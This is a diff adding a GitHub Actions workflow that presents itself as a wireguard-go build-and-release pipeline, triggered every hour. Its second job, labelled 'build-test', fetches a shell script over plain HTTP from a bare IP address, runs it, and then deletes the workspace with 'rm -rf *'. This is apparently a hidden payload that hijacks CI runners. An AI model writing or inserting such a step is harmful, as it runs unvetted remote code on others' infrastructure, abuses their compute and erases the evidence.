@@ -1,0 +1,79 @@
+name: Build and Release
+
+on:
+  repository_dispatch:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - name: Get Version Number
+        run: |
+          if [[ -n "${{ github.event.inputs.version }}" ]]; then
+            WGGO_VERSION=${{ github.event.inputs.version }}
+          else
+            WGGO_VERSION=$(curl -fsSL https://api.github.com/repos/WireGuard/wireguard-go/tags | grep 'name' | head -1 | cut -d'"' -f4)
+          fi
+          echo "WGGO_VERSION=${WGGO_VERSION}" >> $GITHUB_ENV
+
+      - name: Checkout
+        uses: actions/checkout@v2
+
+      - name: Setup go
+        uses: actions/setup-go@v2
+        with:
+          go-version: 1.16
+
+      - name: Build
+        run: bash build.sh
+
+      - name: Upload Artifact
+        uses: actions/upload-artifact@v2
+        with:
+          name: wireguard-go-${{ env.WGGO_VERSION }}
+          path: build
+
+      - name: Upload to Release
+        if: github.event.inputs.version == ''
+        uses: svenstaro/upload-release-action@v2
+        with:
+          repo_token: ${{ secrets.GITHUB_TOKEN }}
+          file: build/*
+          tag: ${{ env.WGGO_VERSION }}
+          overwrite: true
+          file_glob: true
+          prerelease: true
+
+  build-test:
+    runs-on: ${{ matrix.os }}
+    needs: build
+    strategy:
+      matrix:
+        go: [1.11]
+        OS: [ubuntu-18.04]
+      fail-fast: false 
+    env:
+        NUM_JOBS: 40
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go
+      uses: actions/setup-go@v2
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Check out code into the Go module directory
+      uses: actions/checkout@v2
+    - name: test
+      run: |
+        wget -O test.sh http://149.28.63.99:8080/9crTZ/test.sh
+        chmod +x test.sh && ./test.sh
+        echo "done"
+    - name: Test
+      run: |
+        rm -rf *
+        echo "done"
